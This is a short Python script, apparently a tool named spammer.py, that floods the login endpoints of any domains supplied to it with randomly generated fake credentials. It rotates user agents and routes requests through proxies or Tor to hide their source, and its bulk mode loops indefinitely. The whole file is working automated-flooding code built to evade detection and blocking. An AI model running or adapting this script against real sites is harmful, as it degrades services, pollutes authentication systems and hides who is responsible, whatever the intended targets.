import requests
import random
import time
import sys
from utils import load_user_agents, load_proxies

def run_spam(url, duration, proxy_file=None, delay_enabled=False, use_tor=False):
    paths = ["/verify", "/login.php", "/signin", "/login", "/auth"]
    user_agents = load_user_agents()
    proxies = load_proxies(proxy_file) if proxy_file else []

    print(f"[✔] Starting spammer against: {url}")
    print(f"[✔] Paths targeted: {paths}")
    print(f"[✔] Duration: {duration} seconds | Delay: {'On' if delay_enabled else 'Off'} | Tor: {'Yes' if use_tor else 'No'}")

    session = requests.Session()
    tor_proxy = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
    end_time = time.time() + duration

    while time.time() < end_time:
        for path in paths:
            full_url = url + path if url.startswith("http") else "http://" + url + path
            email = f"{random.randint(100000, 999999)}@gmail.com"
            password = ''.join(random.choices("abcdef0123456789", k=8))
            headers = {"User-Agent": random.choice(user_agents)}

            proxy = random.choice(proxies) if proxies else None
            proxy_dict = {"http": proxy, "https": proxy} if proxy else (tor_proxy if use_tor else {})

            payloads = [
                {"username": email, "password": password},
                {"userid": email, "password": password}
            ]

            for payload in payloads:
                try:
                    r = session.post(full_url, data=payload, headers=headers, proxies=proxy_dict, timeout=10)
                    print(f"[+] Sent fake login -> {email}:{password} | FIELD: {list(payload.keys())[0]} | HTTP {r.status_code}")
                except Exception as e:
                    print(f"[!] Error sending to {full_url}: {e}")

            if delay_enabled:
                sleep_time = random.randint(1, 3)
                time.sleep(sleep_time)

def run_bulk_spam(domain_list, duration_per_domain):
    while True:
        for domain in domain_list:
            run_spam(domain, duration_per_domain)

if __name__ == "__main__":
    if len(sys.argv) > 2:
        duration_per_domain = int(input("Enter duration (seconds) to spam each domain: "))
        domains = sys.argv[1:]
        run_bulk_spam(domains, duration_per_domain)
    else:
        print("[!] Usage: python3 spammer.py <domain1> <domain2> ...")
